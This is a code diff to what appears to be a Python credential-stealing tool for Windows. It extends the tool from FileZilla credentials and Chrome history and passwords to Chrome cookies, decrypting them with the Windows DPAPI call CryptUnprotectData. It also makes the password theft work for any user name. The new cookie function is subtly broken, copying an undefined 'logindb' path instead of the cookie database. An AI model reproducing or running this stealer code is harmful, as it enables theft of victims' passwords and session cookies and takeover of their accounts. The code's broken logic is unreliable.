@@ -9,6 +9,7 @@
 #6) Filezilla server credentials(plain text)
 #7) Chrome browsing history
 #8) Chrome login data
+#9) Chrome cookies
 
 import datetime
 import re
@@ -18,6 +19,7 @@ import os
 import sqlite3
 from stealersfunctions import *
 
+import win32crypt
 import win32api
 import win32security
 
@@ -150,7 +152,7 @@ def chromehistory(user):
     os.remove(newloc)
 
 def chromepasswords(user):
-    logindb = "C:\\Users\\" + "Joren" + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+    logindb = "C:\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
     newloc = "C:\\Temp\\temp"
     copyfile(logindb,newloc)
 
@@ -163,5 +165,19 @@ def chromepasswords(user):
     os.remove(newloc)
 
     return data
-    
+
+def chromecookies(user):
+    cookiedb = "C:\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
+    newloc = "C:\\Temp\\temp"
+    copyfile(logindb,newloc)
+
+    conn = sqlite3.connect(newloc)
+    c = conn.cursor()
+    c.execute("""SELECT host_key, name, path, encrypted_value FROM cookies""")
+
+    data = [(str(row[0]), str(row[1]), str(row[2]), str(win32crypt.CryptUnprotectData(row[3], None, None, None, 0)[1])) for row in c]
+    conn.close()
+    os.remove(newloc)
+
+    return data   
     
